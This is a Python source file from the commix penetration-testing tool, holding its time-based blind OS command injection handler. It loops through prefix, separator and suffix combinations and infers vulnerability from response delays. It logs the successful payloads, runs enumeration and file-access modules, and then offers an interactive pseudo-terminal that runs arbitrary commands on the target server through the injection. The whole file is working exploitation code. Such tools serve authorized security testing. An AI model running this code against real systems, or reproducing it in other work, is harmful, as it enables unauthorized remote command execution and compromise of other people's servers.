#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix (@commixproject) tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

import re
import sys
import time
import string
import random
import urllib
import urllib2

from src.utils import menu
from src.utils import colors
from src.utils import settings

from src.core.requests import headers
from src.core.requests import parameters

from src.core.injections.blind_based.techniques.time_based import tb_injector
from src.core.injections.blind_based.techniques.time_based import tb_payloads
from src.core.injections.blind_based.techniques.time_based import tb_enumeration
from src.core.injections.blind_based.techniques.time_based import tb_file_access

"""
 The "time-based" injection technique on Blind OS Command Injection.
"""

#-------------------------------------------------
# The "time-based" injection technique handler.
#-------------------------------------------------
def tb_injection_handler(url,delay,filename,http_request_method):
        
  num_of_chars = 0
  counter = 0
  vp_flag = True
  no_result = True
  is_encoded= False
  export_injection_info = False
  injection_type = "Blind-based Command Injection"
  technique = "time-based injection technique"
      
  # Check if defined "--maxlen" option.
  if menu.options.maxlen:
    maxlen = menu.options.maxlen
    
  # Check if defined "--url-reload" option.
  if menu.options.url_reload == True:
    print colors.BGRED + "(x) Error: The '--url-reload' option is not available in "+ technique +"!" + colors.RESET

  # Calculate all possible combinations
  total = (len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES) - len(settings.JUNK_COMBINATION))
  
  # Estimating the response time (in seconds)
  request = urllib2.Request(url)
  headers.do_check(request)
  start = time.time()
  response = urllib2.urlopen(request)
  response.read(1)
  response.close()
  end = time.time()
  diff = end - start
  url_time_response = int(diff)
  if url_time_response != 0 :
    print colors.BOLD + "(!) The estimated response time is " + str(url_time_response) + " second" + "s"[url_time_response == 1:] + "." + colors.RESET
  delay = int(delay) + int(url_time_response)
  
  for prefix in settings.PREFIXES:
    for suffix in settings.SUFFIXES:
      for separator in settings.SEPARATORS:
        num_of_chars = num_of_chars + 1
        
        # Check for bad combination of prefix and separator
        combination = prefix + separator
        if combination in settings.JUNK_COMBINATION:
          prefix = ""
        
        # Define alter shell
        alter_shell = menu.options.alter_shell
        
        # Change TAG on every request to prevent false-positive results.
        TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
        tag_length = len(TAG) + 4
        
        for output_length in range(1,int(tag_length)):
          try:
            
            if alter_shell:
              # Time-based decision payload (check if host is vulnerable).
              payload = tb_payloads.decision_alter_shell(separator,TAG,output_length,delay,http_request_method)
            else:
              # Time-based decision payload (check if host is vulnerable).
              payload = tb_payloads.decision(separator,TAG,output_length,delay,http_request_method)

            # Check if defined "--prefix" option.
            if menu.options.prefix:
              prefix = menu.options.prefix
              payload = prefix + payload
            else:
              payload = prefix + payload

            # Check if defined "--suffix" option.
            if menu.options.suffix:
              suffix = menu.options.suffix
              payload = payload + suffix
            else:
              payload = payload + suffix
              
            # Check if defined "--verbose" option.
            if menu.options.verbose:
              sys.stdout.write("\n" + colors.GREY + payload.replace("\n","\\n") + colors.RESET)
                
            # Check if target host is vulnerable.
            how_long,vuln_parameter = tb_injector.injection_test(payload,http_request_method,url)
            if not menu.options.verbose:
              percent = ((num_of_chars*100)/total)
              if how_long >= delay:
                percent = colors.GREEN + "SUCCEED" + colors.RESET
              elif percent == 100:
                if no_result == True:
                  percent = colors.RED + "FAILED" + colors.RESET
                else:
                    percent = str(percent)+"%"
              else:
                percent = str(percent)+"%"
              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
              sys.stdout.flush()
              
          except KeyboardInterrupt: 
            raise
        
          except:
            break
          
          # Yaw, got shellz! 
          # Do some magic tricks!
          if how_long >= delay :
            found = True
            no_result = False
            
            # Print the findings to log file.
            if export_injection_info == False:
              output_file = open(filename + ".txt", "a")
              output_file.write("\n(+) Type : " + injection_type)
              output_file.write("\n(+) Technique : " + technique.title())
              output_file.close()
              export_injection_info = True
  
            if http_request_method == "GET":
              # Print the findings to log file
              if vp_flag == True:
                output_file = open(filename + ".txt", "a")
                output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
                output_file.write("\n")
                vp_flag = False
                output_file.close()
                
              counter = counter + 1
              output_file = open(filename + ".txt", "a")
              output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
              output_file.close()

              #Vulnerable Parameter
              GET_vuln_param = parameters.vuln_GET_param(url)
              
              # Print the findings to terminal.
              print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + colors.UNDERL + GET_vuln_param + colors.RESET + colors.BOLD + "' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
              print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
              print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
              print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", urllib.unquote_plus(payload.replace("\n","\\n"))) + colors.RESET
                
            else :
              # Print the findings to log file
              if vp_flag == True:
                output_file = open(filename + ".txt", "a")
                output_file.write("\n(+) Parameter : " + vuln_parameter + " (" + http_request_method + ")")
                output_file.write("\n")
                vp_flag = False
                output_file.close()
                
              counter = counter + 1
              output_file = open(filename + ".txt", "a")
              output_file.write("  ("+str(counter)+") Payload : "+ re.sub("%20", " ", payload) + "\n")
              output_file.close()

              #Vulnerable Parameter
              POST_vuln_param = vuln_parameter
              
              # Print the findings to terminal.
              print colors.BOLD + "\n(!) The ("+ http_request_method + ") '" + colors.UNDERL + POST_vuln_param + colors.RESET + colors.BOLD + "' parameter is vulnerable to "+ injection_type +"."+ colors.RESET
              print "  (+) Type : "+ colors.YELLOW + colors.BOLD + injection_type + colors.RESET + ""
              print "  (+) Technique : "+ colors.YELLOW + colors.BOLD + technique.title() + colors.RESET + ""
              print "  (+) Payload : "+ colors.YELLOW + colors.BOLD + re.sub("%20", " ", payload.replace("\n","\\n")) + colors.RESET
              
            # Check for any enumeration options.
            tb_enumeration.do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)

            # Check for any system file access options.
            tb_file_access.do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
            
            # Pseudo-Terminal shell
            while True:
              gotshell = raw_input("\n(*) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
              if gotshell in settings.CHOISE_YES:
                print ""
                print "Pseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
                while True:
                  try:
                    cmd = raw_input("Shell > ")
                    if cmd == "q":
                      sys.exit(0)
                      
                    else:
                      # The main command injection exploitation.
                      check_how_long,output  = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
                      
                      if menu.options.verbose:
                        print ""
                      print "\n\n" + colors.GREEN + colors.BOLD + output + colors.RESET
                      print "\n(*) Finished in "+ time.strftime('%H:%M:%S', time.gmtime(check_how_long)) +".\n"
                      
                  except KeyboardInterrupt: 
                    print ""
                    sys.exit(0)
                
              elif gotshell in settings.CHOISE_NO:
                break
                if menu.options.verbose:
                  sys.stdout.write("\r(*) Continue testing the "+ technique +"... ")
                  sys.stdout.flush()
              
              else:
                if gotshell == "":
                  gotshell = "enter"
                print colors.BGRED + "(x) Error: '" + gotshell + "' is not a valid answer." + colors.RESET
                pass
              
            break
          
  if no_result == True:
    if menu.options.verbose == False:
      print ""
      return False
    else:
      print ""
      return False
  else :
    sys.stdout.write("\r")
    sys.stdout.flush()
    
def exploitation(url,delay,filename,http_request_method):
    if tb_injection_handler(url,delay,filename,http_request_method) == False:
      return False
    
#eof
